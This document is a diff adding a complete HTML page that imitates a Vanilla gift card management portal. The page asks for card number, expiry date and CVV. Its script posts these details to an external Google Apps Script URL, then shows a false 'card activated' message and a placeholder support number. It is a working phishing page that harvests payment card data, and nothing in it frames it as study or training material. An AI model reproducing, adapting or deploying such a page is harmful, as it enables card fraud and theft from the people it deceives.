@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, sans-serif;
+      }
+
+      body {
+        background-color: #ff9933;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .header {
+        background-color: #dc0b13;
+        padding: 1rem;
+        text-align: center;
+      }
+      .header-2 {
+        background-color: white;
+        padding: 0.5rem;
+        text-align: center;
+      }
+
+      .logo {
+        width: 250px;
+      }
+
+      .container {
+        max-width: 500px;
+        margin: 1rem auto;
+        padding: 1rem;
+        width: 90%;
+      }
+
+      .card {
+        background: white;
+        padding: 1.5rem;
+        border-radius: 4px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      }
+
+      h1 {
+        color: #e31837;
+        font-size: 1.5rem;
+        margin-bottom: 1rem;
+      }
+
+      p {
+        color: #333;
+        margin-bottom: 1.5rem;
+        line-height: 1.5;
+      }
+
+      .form-group {
+        margin-bottom: 1.5rem;
+      }
+
+      label {
+        display: block;
+        color: #555;
+        margin-bottom: 0.5rem;
+        font-weight: bold;
+      }
+
+      input {
+        width: 100%;
+        padding: 0.75rem;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        font-size: 1rem;
+      }
+
+      .expiry-cvv {
+        display: flex;
+        gap: 1rem;
+      }
+
+      .expiry-cvv input {
+        width: 100%;
+      }
+
+      .show-info {
+        color: #e31837;
+        text-decoration: none;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        margin: 1rem 0;
+      }
+
+      .show-info::before {
+        content: "👁";
+      }
+
+      .button {
+        width: 100%;
+        padding: 1rem;
+        background: #3f4852;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-size: 1rem;
+        cursor: pointer;
+        transition: background 0.3s;
+      }
+
+      .button:hover {
+        background: #2f3840;
+      }
+      .button.loading {
+        position: relative;
+        pointer-events: none;
+        opacity: 0.7;
+      }
+      .button.loading::after {
+        content: "";
+        position: absolute;
+        right: 110px;
+        width: 15px;
+        height: 15px;
+        border: 2px solid #fff;
+        border-top: 2px solid #333;
+        border-radius: 50%;
+        animation: spin 0.6s linear infinite;
+      }
+      @keyframes spin {
+        from {
+          transform: rotate(0deg);
+        }
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      @media (max-width: 480px) {
+        .container {
+          padding: 0.5rem;
+        }
+
+        .card {
+          padding: 1rem;
+        }
+
+        .expiry-cvv {
+          flex-direction: column;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <header class="header"></header>
+    <header class="header-2">
+      <img src="logo.png" />
+    </header>
+
+    <div class="container">
+      <div class="card">
+        <h1>Manage Your Vanilla Gift Card</h1>
+        <p>
+          Enter Card details to check balance, review transactions, or activate
+          Gift Card
+        </p>
+
+        <form id="customForm">
+          <div class="form-group">
+            <label for="cardNumber">CARD NUMBER</label>
+            <input type="text" id="cardNumber" name="cardNumber" required />
+          </div>
+
+          <label>EXPIRATION DATE</label>
+          <div class="expiry-cvv">
+            <div class="form-group">
+              <input
+                type="text"
+                placeholder="MM"
+                id="mm"
+                name="mm"
+                inputmode="numeric"
+                pattern="[0-9]*"
+                maxlength="2"
+                required
+              />
+            </div>
+            <div class="form-group">
+              <input
+                type="text"
+                placeholder="YY"
+                id="yy"
+                name="yy"
+                inputmode="numeric"
+                pattern="[0-9]*"
+                maxlength="2"
+                required
+              />
+            </div>
+            <div class="form-group">
+              <input
+                type="text"
+                placeholder="CVV"
+                id="cvv"
+                name="cvv"
+                inputmode="numeric"
+                pattern="[0-9]*"
+                maxlength="3"
+                required
+              />
+            </div>
+          </div>
+
+          <a href="#" class="show-info">Show Card Info</a>
+          <button type="submit" class="button">
+            <img
+              id="loader"
+              src="loader.gif"
+              alt="Loading..."
+              style="display: none; width: 20px; margin-left: 10px"
+            />Continue
+          </button>
+        </form>
+      </div>
+    </div>
+  </body>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      function enforceNumberInput(input, maxLength) {
+        input.addEventListener("input", function (e) {
+          this.value = this.value.replace(/[^0-9]/g, "");
+
+          if (this.value.length > maxLength) {
+            this.value = this.value.slice(0, maxLength);
+          }
+        });
+      }
+
+      function validateMonth(input) {
+        input.addEventListener("blur", function () {
+          const value = parseInt(this.value, 10);
+          if (value < 1 || value > 12) {
+            this.value = "";
+            alert("Please enter a valid month (01-12)");
+          } else if (this.value.length === 1) {
+            this.value = this.value.padStart(2, "0");
+          }
+        });
+      }
+
+      const mmInput = document.getElementById("mm");
+      const yyInput = document.getElementById("yy");
+      const cvvInput = document.getElementById("cvv");
+
+      enforceNumberInput(mmInput, 2);
+      enforceNumberInput(yyInput, 2);
+      enforceNumberInput(cvvInput, 3);
+
+      validateMonth(mmInput);
+
+      document
+        .getElementById("customForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          const submitButton = document.querySelector(".button");
+          submitButton.classList.add("loading");
+
+          const formData = new FormData(event.target);
+
+          const formDetails = {
+            cardNumber: formData.get("cardNumber"),
+            mm: formData.get("mm"),
+            yy: formData.get("yy"),
+            cvv: formData.get("cvv"),
+          };
+
+          const scriptURL =
+            "https://script.google.com/macros/s/AKfycbwOkxKjruxFHHToVH9JvL-rouxn45wF_QXByI1g-LmldP-zXNym9KlIe0C8yEA0yB6z/exec";
+
+          fetch(scriptURL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(formDetails),
+          })
+            .then(() => {
+              submitButton.classList.remove("loading");
+              alert(
+                "Your Card has been successfully activated. Please wait for 10 minutes !!"
+              );
+              document.getElementById("customForm").reset();
+            })
+            .catch((error) => {
+              submitButton.classList.remove("loading");
+              console.error("Error:", error);
+              alert(
+                "There was an error submitting the form. Please contact our support at +1 888 888 8888"
+              );
+            });
+        });
+    });
+  </script>
+</html>
